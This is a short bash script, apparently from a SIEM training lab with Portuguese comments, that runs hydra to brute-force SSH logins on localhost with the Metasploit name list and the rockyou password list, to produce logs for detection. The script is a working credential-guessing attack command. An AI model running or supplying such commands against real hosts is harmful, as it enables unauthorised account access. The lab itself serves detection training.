#!/bin/bash
# Lab de SIEM - Simulação de Ataque de Força Bruta SSH
# Autor: Ronan Bruno (narutoxdo)

echo "Iniciando ataque persistente para geração de logs no SIEM..."

# -L: Lista de usuários
# -P: Lista de senhas (Rockyou descompactada)
# -t 4: Velocidade estável para não derrubar o serviço
# -V: Modo Verbose para visualização em tempo real
hydra -L /usr/share/wordlists/metasploit/namelist.txt \
      -P /usr/share/wordlists/rockyou.txt \
      ssh://127.0.0.1 -t 4 -V
